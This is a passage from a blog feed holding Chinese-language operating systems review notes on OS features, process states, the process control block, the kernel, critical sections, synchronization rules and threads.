href="#操作系统的定义" class="headerlink" title="操作系统的定义"></a>操作系统的定义</h5><p>操作系统（Operating System，简称OS）是控制和管理计算机硬件和软件资源的一个系统软件,是一些程序模块的集合。<br> 它能以尽量有效、合理的方式组织和管理计算机的软硬件资源，合理的组织计算机的工作流程，控制程序的执行并向用户提供各种服务功能，使得用户能够灵活、方便、有效的使用计算机，使整个计算机系统能高效地运行。<br> 它是系统软件的核心，是计算机处理时必不可少的非常重要的软件。</p><h5 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h5><p>并发性<br>共享性<br>虚拟性<br>异步性</p><h6 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h6><p>并行性是指两个或多个事件在同一时间发生。<br>并发性是指两个或多个事件在同一时间间隔内发生。 (与并发相似，但多指硬件支持）<br>进程、线程</p><h6 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h6><p>互斥共享方式：打印机、磁带机<br>同时访问方式： 磁盘、文件</p><h6 id="虚拟性"><a href="#虚拟性" class="headerlink" title="虚拟性"></a>虚拟性</h6><p>时分复用技术：分时使用<br>(1)虚拟处理机技术<br>(2)虚拟设备技术：如共享打印机<br>空分复用技术<br>(1)虚拟磁盘技术<br>(2)虚拟存储器技术</p><h5 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h5><p>从资源管理观点看，操作系统具有五大功能：<br> 处理机管理<br> 存储器管理<br> 设备管理<br> 文件管理<br> 作业管理</p><h3 id="第二章-进程的描述与控制"><a href="#第二章-进程的描述与控制" class="headerlink" title="第二章 进程的描述与控制"></a>第二章 进程的描述与控制</h3><h4 id="进程的定义和特征"><a href="#进程的定义和特征" class="headerlink" title="进程的定义和特征"></a>进程的定义和特征</h4><p>进程的定义：<br>进程是程序在一个数据集合上的运行过程，是系统进行资源分配和调度的一个独立的基本单位。<br>进程实体组成：程序段、数据段、PCB（进程控制块）<br>进程的特征：<br>(1)动态性：进程是程序的一次运行过程，有生命周期。<br>(2)并发性<br>(3)独立性：进程是一个能独立运行的基本单位，同时也是系统分配资源和调度的独立单位<br>(4)异步性:进程按各自独立的、 不可预知的速度向前推进.</p><h4 id="进程的基本状态及转换"><a href="#进程的基本状态及转换" class="headerlink" title="进程的基本状态及转换"></a>进程的基本状态及转换</h4><h5 id="1-进程的三种基本状态"><a href="#1-进程的三种基本状态" class="headerlink" title="1.进程的三种基本状态"></a>1.进程的三种基本状态</h5><p>就绪状态（Ready）：得到了除CPU以外的所有必要资源。<br> 执行状态（Running）：已获得处理机，程序正在被执行。<br> 阻塞状态（Blocked）：因等待某事件发生而暂时无法继续执行，从而放弃处理机，使程序执行处于暂停状态。</p><h5 id="2-三种基本状态的转换"><a href="#2-三种基本状态的转换" class="headerlink" title="2.三种基本状态的转换"></a>2.三种基本状态的转换</h5><p><img src="http://img.cdn.cuittk.cn/p6j8vv5j4ko3wrqwjikda9v3u9.png" alt=""></p><h5 id="3-创建状态和终止状态"><a href="#3-创建状态和终止状态" class="headerlink" title="3.创建状态和终止状态"></a>3.创建状态和终止状态</h5><p><img src="http://img.cdn.cuittk.cn/ulsdlsniulv50aqe059xrfr1f9.png" alt=""></p><h4 id="挂起操作和进程状态的转换"><a href="#挂起操作和进程状态的转换" class="headerlink" title="挂起操作和进程状态的转换"></a>挂起操作和进程状态的转换</h4><p><img src="http://img.cdn.cuittk.cn/g6r67co2vgqfr76c5bc2ekzczb.png" alt=""></p><h4 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h4><h5 id="进程控制块的作用"><a href="#进程控制块的作用" class="headerlink" title="进程控制块的作用"></a>进程控制块的作用</h5><p>概念<br>用于描述进程情况及控制进程运行所需要的全部信息<br>作用<br>通过PCB，使得原来不能独立运行的程序（数据），成为一个可以独立运行的基本单位，一个能够并发执行的进程。进程控制块是进程存在的唯一标志。<br>进程控制块中的信息<br>进程标识符：唯一地标识一个进程。<br>处理机状态：保留进程存放在处理器中的各种信息，主要由处理器内的各个寄存器的内容组成。<br> 进程调度信息：进程状态、进程优秀级、阻塞原因等等。<br> 进程控制信息：程序和数据的地址、进程同步和通信机制、资源清单、链接指针       </p><h4 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h4><p>进程控制是对系统中所有进程从产生、存在到消亡的全过程实行有效的管理和控制。进程控制一般是由操作系统的内核来实现，内核在执行操作时，往往是通过执行各种原语操作来实现的<br>内核：加在硬件上的第一层软件，通过执行各种原语操作来实现各种控制和管理功能，具有创建、撤消、进程通信、资源管理的功能。<br>内核的基本功能<br> 支撑功能：中断处理、时钟管理、原语操作<br> 资源管理功能：进程管理、存贮管理、设备管理<br> 原语：是由若干条机器指令所构成，用以完成特定功能的一段程序 。原语在执行期间是不可分割的或不可中断的。<br> 创建原语、撤消原语、阻塞原语、唤醒原语</p><h4 id="临界资源"><a href="#临界资源" class="headerlink" title="临界资源"></a>临界资源</h4><p> 一次仅允许一个进程使用的资源，如打印机、变量。<br>生产者-消费者（producer-consumer）问题是一个著名的进程同步问题。<br>要令其互斥地访问变量counter</p><h4 id="临界区-critical-section"><a href="#临界区-critical-section" class="headerlink" title="临界区(critical section)"></a>临界区(critical section)</h4><p>临界区是每个进程中访问临界资源的那段代码。<br>while(True)<br>{<br>    进入区<br>    临界区<br>    退出区<br>    剩余区<br>}</p><h4 id="同步机制应遵循的规则"><a href="#同步机制应遵循的规则" class="headerlink" title="同步机制应遵循的规则"></a>同步机制应遵循的规则</h4><p>(1) 空闲让进。<br>(2) 忙则等待。<br>(3) 有限等待。<br>(4) 让权等待</p><h4 id="记录型信号量、利用记录型信号量解决生产者-消费者问题"><a href="#记录型信号量、利用记录型信号量解决生产者-消费者问题" class="headerlink" title="记录型信号量、利用记录型信号量解决生产者-消费者问题"></a>记录型信号量、利用记录型信号量解决生产者-消费者问题</h4><h4 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h4><p>线程与进程的比较<br>调       度： 进程不再是调度的基本单位。<br>并  发  性： 进程之间可以并发，线程之间也可以并发执行。<br>拥有资源： 线程几乎不占资源，同一进程的线程共享进程的资源。<br>独立性： 同一进程中的不同线程之间的独立性要低很多。<br>系统开销：线程的创建、撤消与切换的系统开销小的多。<br>支持多处理机系统</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;操作系统复习&quot;&gt;&lt;a href=&quot;#操作系统复习&quot; class=&quot;headerlink&quot; title=&quot;操作系统复习&quot;&gt;&lt;/a&gt;操作系统复习&lt;/h2&gt;&lt;h3 id=&quot;第一章-操作系统引论&quot;&gt;&lt;a href=&quot;#第一章-操作系统引论&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="课程" scheme="https://blog.cuittk.cn/categories/%E8%AF%BE%E7%A8%8B/"/>
    
    
  </entry>
  
</feed>
